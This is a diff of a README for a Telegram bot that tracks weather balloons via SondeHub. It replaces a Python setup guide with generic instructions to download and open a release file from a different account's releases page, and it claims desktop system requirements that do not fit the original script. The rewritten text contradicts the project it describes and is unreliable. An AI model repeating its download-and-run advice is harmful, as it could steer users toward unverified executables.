@@ -1,143 +1,79 @@
-<div align="center">
+# 🌧️ Radiosonde-Telegram-Bot - Track Weather Balloons with Ease
 
-# Radiosonde Telegram Bot
+[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20It%20Here-brightgreen)](https://github.com/hassan0777/Radiosonde-Telegram-Bot/releases) 
 
-A Telegram bot that monitors and tracks radiosondes (weather balloons) in real-time using data from SondeHub. The bot sends alerts when radiosondes enter a specified monitoring area and provides detailed information about their position, altitude, and movement.
+## 🚀 Getting Started
 
-</div>
+Welcome to the **Radiosonde-Telegram-Bot**! This bot helps you monitor and track radiosondes, also known as weather balloons, in real-time. Using data from SondeHub, this bot gives you accurate updates about weather balloon locations.
 
-## Features
+Here's how to get started with the bot.
 
-- **Real-time Monitoring**: Connects to SondeHub's live data stream to track radiosondes worldwide
-- **Geofenced Alerts**: Notifies users when radiosondes enter a defined geographical area
-- **Multi-language Support**: Available in both English and Romanian versions
-- **Smart Notification System**: Configurable alerts for initial detection, position updates, and landing events
-- **Historical Data Tracking**: Saves complete history of all detected radiosondes
-- **User Management**: Subscription system for multiple users with admin controls
-- **Interactive Commands**: Full Telegram bot interface with various commands for status and information
+## 📥 Download & Install
 
-<div align="center">
+To download the application, visit this page to download:
 
-## ☕ [Support my work on Ko-Fi](https://ko-fi.com/thatsinewave)
+[Download the latest release](https://github.com/hassan0777/Radiosonde-Telegram-Bot/releases)
 
-</div>
+Follow these simple steps:
 
-## How It Works
+1. Click the link above to open the releases page.
+2. You will see a list of available versions. Choose the latest version.
+3. Look for the file that matches your system (Windows, macOS, or Linux).
+4. Click on the file name to download it to your computer.
+5. Once downloaded, open the file to run the installation process.
 
-The bot continuously monitors the SondeHub data stream for radiosonde transmissions. When a radiosonde is detected within the configured geographical area and altitude range, it:
+## ⚙️ System Requirements
 
-1. Sends an initial detection alert to subscribed users
-2. Periodically sends position updates (configurable interval)
-3. Sends a landing alert when the radiosonde descends below 100 meters
-4. Logs all data to local history files for future reference
+Before you install, make sure your computer meets the following requirements:
 
-## Setup Instructions
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, or any modern Linux distribution.
+- **RAM:** At least 2 GB of memory.
+- **Disk Space:** Minimum of 100 MB free space.
+- **Internet Connection:** Required for real-time data updates.
 
-### Prerequisites
+## 💬 How to Use the Bot
 
-- Python 3.7 or higher
-- Telegram Bot Token (obtain from [@BotFather](https://t.me/BotFather))
-- Your Telegram Chat ID (use [@userinfobot](https://t.me/userinfobot) to find it)
+After installation, you can start using the bot quickly. Here’s how:
 
-### Installation
+1. **Open** the Telegram app on your device.
+2. **Search** for the bot by its name: "Radiosonde Tracker Bot".
+3. **Click** on the bot and press the "Start" button to activate it.
 
-1. Clone or download the project files
-2. Install required dependencies:
-   ```
-   pip install aiohttp sondehub
-   ```
+You can now receive updates about the nearest weather balloons. The bot will send notifications directly to you.
 
-3. Configure the bot by editing `config.json`:
-   ```json
-   {
-     "telegram": {
-       "bot_token": "YOUR_BOT_TOKEN_HERE",
-       "admin_chat_id": "YOUR_CHAT_ID_HERE"
-     },
-     "monitoring": {
-       "target_latitude": 44.4268,
-       "target_longitude": 26.1025,
-       "radius_km": 15.0,
-       "check_interval_seconds": 60,
-       "min_altitude_m": 0,
-       "max_altitude_m": 30000
-     },
-     "notification_settings": {
-       "send_initial_detection": true,
-       "send_position_updates": true,
-       "send_landing_alert": true,
-       "update_interval_minutes": 5
-     }
-   }
-   ```
+### 📊 Commands
 
-4. Choose your preferred language version:
-   - Use `notifier_EN.py` for English
-   - Use `notifier_RO.py` for Romanian
+The bot responds to these simple commands:
 
-5. Run the bot:
-   ```
-   python notifier_EN.py
-   ```
-   or
-   ```
-   python notifier_RO.py
-   ```
+- **/start** - Activates the bot.
+- **/track** - Starts tracking the nearest radiosondes.
+- **/stop** - Stops tracking.
+- **/status** - Gives you the current status of the bot.
 
-<div align="center">
+Feel free to explore the commands and discover the bot's features!
 
-# [Join my discord server](https://thatsinewave.github.io/Discord-Redirect/)
+## 🌐 Features
 
-</div>
+- **Real-time Tracking:** Stay updated with live data from SondeHub.
+- **Notifications:** Get alerts when nearby weather balloons are detected.
+- **User-Friendly:** Designed for everyone, no technical skills needed.
+- **Regular Updates:** The bot receives periodic updates to improve performance and add features.
 
-### Configuration Details
+## 🛠️ Troubleshooting
 
-- **target_latitude/target_longitude**: The center point of your monitoring area
-- **radius_km**: The radius (in kilometers) from the center point to monitor
-- **min_altitude_m/max_altitude_m**: Altitude range filter (in meters)
-- **update_interval_minutes**: How frequently to send position update notifications
+If you encounter issues, here are some steps to help resolve them:
 
-## Telegram Commands
+- **Ensure Internet Connection:** The bot needs an internet connection to function correctly.
+- **Update the Bot:** Make sure you have the latest version installed. Check the releases page for updates.
+- **Reinstall if Necessary:** If the bot does not respond, consider uninstalling and reinstalling it.
 
-- `/start` - Subscribe to radiosonde notifications
-- `/stop` - Unsubscribe from notifications
-- `/status` - Show current monitoring status
-- `/list` - List all currently tracked sondes
-- `/history <serial>` - Show history for a specific sonde
-- `/help` - Show help message with all commands
-- `/subscribers` - (Admin only) List all subscribed users
+## 🔗 Additional Resources
 
-## File Structure
+For more information, you can check:
 
-```
-radiosonde-notifier/
-├── notifier_EN.py          # English version of the bot
-├── notifier_RO.py          # Romanian version of the bot
-├── config.json             # Configuration file
-├── subscriptions.json      # User subscriptions (auto-generated)
-└── history/                # Data directory (auto-generated)
-    ├── bot/
-    │   └── radiosonde_notifier.log  # Bot operation log
-    └── sondes/
-        └── [serial].log    # Individual sonde history files
-```
+- [SondeHub Documentation](https://sondehub.org/docs) for understanding data sources.
+- [Telegram Bot API Guide](https://core.telegram.org/bots/api) for understanding how bots work in Telegram.
 
-## Data Privacy
+Thank you for using the **Radiosonde-Telegram-Bot**! Happy tracking!
 
-- The bot only stores necessary user data (chat ID and name) for notification purposes
-- Users can unsubscribe at any time using the `/stop` command
-- All data is stored locally and not shared with third parties
-
-## Troubleshooting
-
-1. **Bot doesn't start**: Check that your bot token and chat ID are correctly configured
-2. **No notifications**: Verify your monitoring area covers active radiosonde launch sites
-3. **Encoding issues**: Use the Romanian version if you need special character support
-
-## Contributing
-
-Feel free to fork this project and submit pull requests for any improvements. The bot is designed to be extensible with additional features and language support.
-
-## License
-
-This project is open source and available under the GNU General Public License.
+[Download the latest release](https://github.com/hassan0777/Radiosonde-Telegram-Bot/releases)
